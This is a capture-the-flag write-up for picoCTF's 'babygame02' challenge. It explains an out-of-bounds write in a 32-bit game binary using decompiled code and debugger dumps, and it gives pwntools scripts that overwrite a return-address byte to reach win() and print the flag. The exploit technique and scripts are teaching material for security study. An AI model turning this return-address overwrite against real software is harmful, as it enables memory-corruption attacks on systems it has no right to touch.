### babygame02

Download the file and open it in a decompiler. We can see that there is a `win()` function that prints the flag, but it's not called anywhere.

```c
void win(void)

{
  char local_4c [60];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("flag.txt not found in current directory");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_4c,0x3c,local_10);
  printf(local_4c);
  return;
}
```

Taking a look at the `move_player()` function:

```c
void move_player(int *param_1,char param_2,int param_3)

{
  int iVar1;
  
  if (param_2 == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (param_2 == 'p') {
    solve_round(param_3,param_1);
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = 0x2e;
  if (param_2 == 'w') {
    *param_1 = *param_1 + -1;
  }
  else if (param_2 == 's') {
    *param_1 = *param_1 + 1;
  }
  else if (param_2 == 'a') {
    param_1[1] = param_1[1] + -1;
  }
  else if (param_2 == 'd') {
    param_1[1] = param_1[1] + 1;
  }
  *(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
  return;
}
```

Like the previous game, it moves the player around the map with `wasd`. We can also change the player's tile with `l`. This will be useful because it's a `32-bit` binary, and we see that the address of `win` is `0x0804975d`.

The `main` function is like this:

```c
undefined4 main(void)

{
  int iVar1;
  int local_aa8;
  int local_aa4;
  undefined local_a9d [2700];
  char local_11;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  init_player(&local_aa8);
  init_map(local_a9d,&local_aa8);
  print_map(local_a9d,&local_aa8);
  signal(2,sigint_handler);
  do {
    do {
      iVar1 = getchar();
      local_11 = (char)iVar1;
      move_player(&local_aa8,(int)local_11,local_a9d);
      print_map(local_a9d,&local_aa8);
    } while (local_aa8 != 0x1d);
  } while (local_aa4 != 0x59);
  puts("You win!");
  return 0;
}
```

We see that there is a `2700` byte buffer and with move player we can trigger an `out-of-bounds` bug and write things on the stack. Our exploitation path is to:

* Change player's tile to `0x5d` which is the last byte of `win`.
* Move out of the buffer to overwrite the return address to call `win`.

Taking a better look at thus line inside `move_player`:

```c
*(undefined *)(*param_1 * 0x5a + param_3 + param_1[1]) = player_tile;
```

So, we need to overwrite the address of `param_1` * `0x5a`  + `param_3` + `param_1[1]` to change it to the player tile, which will be the address of `win`, or at least the last byte of it.

Analyzing these 3 params:

* `param_1` -> Pointer to the buffer, the Y axis.
* `param_3` -> The buffer.
* `param_1[1]` -> Pointer to the buffer, the X axis.

We see that the address of the buffer is at `$ebp-0xaa0`. 

```bash
0x8049694 <main+32>        lea    eax, [ebp-0xaa0]

gef➤  x/2gx $ebp-0xaa0
0xffffc588:	0x0000000000000000	0x0000000100030003
```

Let's play a bit with the binary and see how it reacts.

First, we rename our tile to "A". Then, we place it at the start of the buffer.

```bash
Player position: 0 0
End tile position: 29 89
A.........................................................................................
...........................
```

```gdb
gef➤  x/100gx $ebp-0xaa0-32
0xffffc568:	0x08049709ffffd028	0x0000000affffc588
0xffffc578:	0x080496ebffffc593	0x03010101464c457f
0xffffc588:	0x0000000000000000	0x2e2e2e2e41030003 <-- here
```

If we go left with `a`. Our `41` will go there:

```gdb
gef➤  x/100gx $ebp-0xaa0-32
0xffffc568:	0x08049709ffffd028	0x00000061ffffc588
0xffffc578:	0x080496ebffffc593	0x03010101464c457f
0xffffc588:	0xffffffff00000000	0x2e2e2e2e2e410003 <-- here
```

One more `a`.

```gdb
gef➤  x/100gx $ebp-0xaa0-32
0xffffc568:	0x08049709ffffd028	0x00000061ffffc588
0xffffc578:	0x080496ebffffc593	0x03010101464c457f
0xffffc588:	0xfffffffe00000000	0x2e2e2e2e2e2e4103 <-- here
```

What if we send 2 `aa` in a row?

```gdb
gef➤  x/100gx $ebp-0xaa0-32
0xffffc568:	0x08049709ffffd028	0x00000061ffffc588
0xffffc578:	0x080496ebffffc593	0x03010101464c457f
0xffffc588:	0x41fffffc00000000	0x2e2e2e2e2e2e2e2e <-- here
```

We understood how it moves with the `left-right` keys. Now we position it again at the start of the buffer and go up.

```gdb
gef➤  x/100gx $ebp-0xaa0-32
0xffffc568:	0x08049709ffffd028	0x0000000affffc588
0xffffc578:	0x080496ebffffc593	0x03010101464c457f
0xffffc588:	0x0000000000000000	0x2e2e2e2e41030003 <-- here before w
```

```gdb
gef➤  x/100gx $ebp-0xaa0-128
0xffffc508:	0xf7e2a620ffffc538	0xf7e2a000f7e28a60
0xffffc518:	0xf7c7f9f0ffffc578	0xf7ffcb80f7e2a620
0xffffc528:	0xf7c7f6c000000059	0xf7e2ae40f7e2ae40
0xffffc538:	0xf7c79b29f7e24120	0x0804c000f7e2a620 <-- here
0xffffc548:	0x08049481ffffc568	0x0804c000080482cc
0xffffc558:	0x000000770000005a	0xffffd0f40804c000
0xffffc568:	0x08049709ffffd028	0x00000077ffffc588
0xffffc578:	0x080496ebffffc593	0x03010101464c457f
0xffffc588:	0x00000000ffffffff	0x2e2e2e2e2e030003
```

We send another `d` to move it right and verify it is our value and not just a random byte.

```gdb
0xffffc538:	0xf7c79b29f7412e20	0x0804c000f7e2a620
```

This is indeed our value.

#### Recap

* `a-d` will move our byte to the left-right.
* `w` will move our byte 5 rows up and 7 bytes from the start. (92 bytes in total)
* We know the return value of `move_player` is at `0x08049548`.

We need to modify our tile to overwrite this byte with `]` which is the character of `5d`, the last byte of win.

The return address of `move_payer` points to this.

```bash
 →  0x8049548 <move_player+212> ret    
   ↳   0x8049709 <main+149>       add    esp, 0x10
```

We can see this address before our buffer here:

```gdb
0xffffc568:	0x08049709ffffd028	0x00000077ffffc588 <-- here
0xffffc578:	0x080496ebffffc593	0x03010101464c457f
0xffffc588:	0x0000000400000003	0x2e2e2e2e2e030003
0xffffc598:	0x2e2e2e2e2e2e2e2e	0x2e2e2e2e2e2e2e2e
```

We need to do some proper calculations to place our player in the right position.

This solver works locally, but not remotely.

```python
from pwn import *
context.log_level = 'critical'

r = process('./game')

# Change tile to our value
r.sendlineafter(b'\n', b'l]')
r.sendlineafter(b'\n', b'd'*47)
r.sendlineafter(b'\n', b'w'*5)
r.sendlineafter(b'\n', b'w3t')

r.interactive()
```

```bash
.........................................................................................X
flag.txt not found in current directory
```

I guess the address is different in the remote server, so will try to change our character from `]` to something else. Starting bruteforcing, the luck is with us because `a` works.

```python
from pwn import *
context.log_level = 'critical'

r = remote('saturn.picoctf.net', 52450)

# Change tile to our value
r.sendlineafter(b'\n', b'la')
r.sendlineafter(b'\n', b'd'*47)
r.sendlineafter(b'\n', b'w'*5)
r.sendlineafter(b'\n', b'w3t')

r.interactive()
```

```bash
picoCTF{gamer_jump1ng_4r0unD_ed4bea03}
```





